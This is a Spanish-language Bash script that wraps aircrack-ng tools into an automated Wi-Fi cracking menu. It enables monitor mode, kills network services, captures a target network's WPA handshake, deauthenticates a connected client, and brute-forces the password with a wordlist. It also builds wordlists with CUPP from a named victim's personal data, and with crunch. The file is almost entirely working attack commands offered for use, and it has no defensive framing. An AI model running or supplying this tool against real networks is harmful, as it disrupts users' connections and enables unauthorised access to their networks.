#!/bin/bash

#creador del script jaime manquel(cripton666)
#Derechos reservados de autor 
#Codigo personal se puede copiar pero dejar credito 

#herramienta dedicada para poder crear diccionario personalizado y normal 
#y realizar el hackeo automatizado 



#Esta herramienta cuenta con la herramienta CUPP que nos permite crear diccionarios de fuerza bruta 
#dejo sus derechos y los creditos a el o los programadores de esta herramienta
#en el cual su pagina de github es https://github.com/Mebus


trap ctrl_c INT 

function ctrl_c(){
    limpiar
    echo -e "\e[1;33mSaliendo del script...\e[0m"
    sleep 1s 
    limpiar
    exit 0
}
function limpiar(){
    clear 
}
limpiar
sleep 1s 
echo
echo

echo -e "\e[1;31m ▄█     █▄   ▄█     ▄████████  ▄█          ▄████████     ███        ▄████████  ▄████████    ▄█   ▄█▄ \e[0m"
echo -e "\e[1;31m███     ███ ███    ███    ███ ███         ███    ███ ▀█████████▄   ███    ███ ███    ███   ███ ▄███▀ \e[0m"
echo -e "\e[1;31m███     ███ ███▌   ███    █▀  ███▌        ███    ███    ▀███▀▀██   ███    ███ ███    █▀    ███▐██▀   \e[0m"
echo -e "\e[1;31m███     ███ ███▌  ▄███▄▄▄     ███▌        ███    ███     ███   ▀   ███    ███ ███         ▄█████▀    \e[0m"
echo -e "\e[1;31m███     ███ ███▌ ▀▀███▀▀▀     ███▌      ▀███████████     ███     ▀███████████ ███        ▀▀█████▄    \e[0m"
echo -e "\e[1;31m███     ███ ███    ███        ███         ███    ███     ███       ███    ███ ███    █▄    ███▐██▄   \e[0m"
echo -e "\e[1;31m███ ▄█▄ ███ ███    ███        ███         ███    ███     ███       ███    ███ ███    ███   ███ ▀███▄ \e[0m"
echo -e "\e[1;31m ▀███▀███▀  █▀     ███        █▀          ███    █▀     ▄████▀     ███    █▀  ████████▀    ███   ▀█▀ \e[0m"
echo -e "\e[1;31m                                                                                           ▀         \e[0m"

echo
echo
sleep 1s 
echo -e "\e[1;31m  [*]\e[0m \e[96mDerechos reservados para el programador\e[0m \e[1;37m(cripton666)\e[0m"
echo 
echo -e "\e[1;31m  [1]\e[0m \e[1;33mWifi atack\e[0m"
echo -e "\e[1;31m  [2]\e[0m \e[1;33mDiccionario(con los Datos de la victima)\e[0m"
echo -e "\e[1;31m  [3]\e[0m \e[1;33mDiccionario(Personalizado)\e[0m"
echo -e "\e[1;31m  [4]\e[0m \e[1;33mSalir\e[0m"
echo 
while :
do 
opcion=0
sleep 1s 
 echo -n -e "\e[1;37m  Elige una opcion :\e[0m"
read opcion
case $opcion in
1)
#cripton666 (jaime manquel) creador del script 
#herramineta diseñada para el hackeo de redes wifi wpa wpa1 wpa2 via diccionario

trap ctrl_c INT

function ctrl_c(){
	echo -e "\e[1;33mSaliendo del script...\e[0m"
	rm dnsmasq.conf hostapd.conf 2>/dev/null
	rm -r iface 2>/dev/null
	find \-name datos-privados.txt | xargs rm 2>/dev/null
	sleep 3; ifconfig wlan0mon down 2>/dev/null; sleep 1
	iwconfig wlan0mon mode monitor 2>/dev/null; sleep 1
	ifconfig wlan0mon up 2>/dev/null; airmon-ng stop wlan0mon > /dev/null 2>&1; sleep 1
	tput cnorm; service network-manager restart
	exit 0
}
function limpiar_pantalla {
    clear
}
limpiar_pantalla
echo
echo
echo 
echo -e "\e[0;35m         ██╗    ██╗██╗███████╗██╗     █████╗ ████████╗ █████╗  ██████╗██╗  ██╗ \e[0m"
echo -e "\e[0;35m         ██║    ██║██║██╔════╝██║    ██╔══██╗╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝\e[0m"
echo -e "\e[0;35m         ██║ █╗ ██║██║█████╗  ██║    ███████║   ██║   ███████║██║     █████╔╝   \e[0m"
echo -e "\e[0;35m         ██║███╗██║██║██╔══╝  ██║    ██╔══██║   ██║   ██╔══██║██║     ██╔═██╗   \e[0m"
echo -e "\e[0;35m         ╚███╔███╔╝██║██║     ██║    ██║  ██║   ██║   ██║  ██║╚██████╗██║  ██╗   \e[0m"
echo -e "\e[0;35m          ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    \e[0m"
echo                                                                     
echo
sleep 2s 
echo -e "\e[1;37m  [:)]\e[0m \e[96mDerechos reservados del programador\e[0m \e[1;37m(cripton666)\e[0m"
sleep 2s 
echo 
echo -e "\e[1;31m  [*]\e[0m \e[1;33mNo todas las targetas de red admiten modo monitor\e[0m"
echo
sleep 1s
echo -e "\e[1;31m  [*]\e[0m \e[1;33mwlan0\e[0m"
sleep 1s 
echo -e "\e[1;31m  [*]\e[0m \e[1;33mwlan1\e[0m"
sleep 1s 
echo -e "\e[1;31m  [*]\e[0m \e[1;33mwlan2\e[0m"
xterm -hold -e "iwconfig" &
airodump_xterm_PID=$!
echo
sleep 1s
echo -n -e "\e[1;31m  Seleccione su targeta de red :\e[0m"
read TARGETA
limpiar_pantalla
echo
echo -e "\e[1;31m[*]\e[0m \e[1;33mwlan0mon\e[0m"
echo -e "\e[1;31m[*]\e[0m \e[1;33mwlan1mon\e[0m"
echo -e "\e[1;31m[*]\e[0m \e[1;33mwlan2mon\e[0m"
echo
echo -n -e "\e[1;31mSeleccione extencion de targeta wlan0,1,2 EJ:(wlan0mon):\e[0m"
read wlan0
limpiar_pantalla
echo -e "\e[1;31m[*]\e[0m \e[1;33m Estableciendo a modo monitor\e[0m"
sleep 2s 
sudo airmon-ng start $TARGETA 
limpiar_pantalla
echo -e "\e[1;31m[*]\e[0m \e[1;33m Conectado con exito\e[0m"
sleep 2s 
echo -e "\e[1;31m[*]\e[0m \e[1;33m Matando conecciones conflictivas\e[0m"
sleep 3s 
killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
echo -e "\e[1;31m[*]\e[0m \e[1;33m Dhclient\e[0m"
sleep 3s 
echo -e "\e[1;31m[*]\e[0m \e[1;33m Network-manager\e[0m"
sleep 3s 
echo -e "\e[1;31m[*]\e[0m \e[1;33m Wpasupplicant\e[0m"
sleep 2s 
echo -e "\e[1;31m[*]\e[0m \e[1;33m Creando carpeta de captura\e[0m"
sleep 2s 
mkdir Capturas
echo -e "\e[1;31m[*]\e[0m \e[1;33m Creada con exito\e[0m"
cd Capturas
echo -e "\e[1;31m[*]\e[0m \e[1;33m Escaneando redes sercanas disponibles\e[0m"
sleep 4s 
xterm -hold -e "sudo airodump-ng $wlan0" &
airodump_xterm_PID=$!
limpiar_pantalla
echo -n -e "\e[1;31mSeleccione la mac bssid de la red que desea atacar :\e[0m"
read red 
sleep 2s 
echo -n -e "\e[1;31mSeleccione el canal ch de la red :\e[0m"
read CH 
echo -n -e "\e[1;31mSeleccione un nombre para la captura :\e[0m"
read CAPTURA
limpiar_pantalla
xterm -hold -e "sudo airodump-ng -c $CH -w $CAPTURA --bssid $red $wlan0" &
airodump_xterm_PID=$!
echo -e "\e[1;31m[*]\e[0m \e[1;33m Vamos a desautenticar a un cliente conectado\e[0m"
sleep 2s 
echo -n -e "\e[1;31mSeleccione la mac station de la red :\e[0m"
read USUARIO
limpiar_pantalla
sleep 2s 
echo -e "\e[1;31m[*]\e[0m \e[1;33m Desautenticando a usuario\e[0m"
sleep 1s 
echo -e "\e[1;31m[*]\e[0m \e[1;33m Interactuando con cliente \e[0m"
sudo aireplay-ng -0 20 -a $red -c $USUARIO $wlan0 
limpiar_pantalla
echo -e "\e[1;31m[*]\e[0m \e[1;33m Coneccion exitosa \e[0m"
echo
sleep 1s 
echo -e "\e[1;31m[*]\e[0m \e[1;33m No continue hasta tener el handshaker \e[0m"
sleep 2s 
echo -n -e "\e[1;31mPara terminar pone el nombre de la captura con su extencion :\e[0m"
read EXTENCION
sleep 2s 
echo -e "\e[1;31m[*]\e[0m \e[1;33m Vamos a intentar descriptar la contraseña\e[0m"
sleep 2s 
echo -n -e "\e[1;31mSeleccione la ruta del diccionario :\e[0m"
read DICCIONARIO
limpiar_pantalla
sudo aircrack-ng -w $DICCIONARIO -b $red $EXTENCION
read enterkey
;;
2)
limpiar
cd cupp
python3 cupp.py -i 
read enterkey
;;
3)
limpiar
echo -e "\e[1;33mRecopilando datos para crear el diccionario\e[0m"
sleep 1s 
echo
echo -n -e "\e[1;33mIngrese el minimo de caracteres :\e[0m"
read minimo
sleep 1s
echo 
echo -n -e "\e[1;33mIngrese el maximo de caracteres :\e[0m"
read maximo
sleep 1s
echo  
echo -n -e "\e[1;33mIngrese los caracteres del diccionario :\e[0m"
read diccionario
sleep 1s
echo 
echo -n -e "\e[1;33mNombre del diccionario y al final agregar .txt :\e[0m"
read nombre 
sleep 1s 
limpiar
echo -e "\e[1;33mCreando diccionario"
crunch $minimo $maximo $diccionario -o $nombre 
limpiar
echo -e "\e[1;33mCreado con exito\e[0m"
sleep 3s
./wifiatack.sh
read enterkey
;;
4)
limpiar
    echo -e "\e[1;33mSaliendo del script\e[0m"
    sleep 1s 
    limpiar
    exit 0
read enterkey
;;
*)
clear
echo "La opcion $opcion no esta en la lista"
read enterkey
;;
esac
done




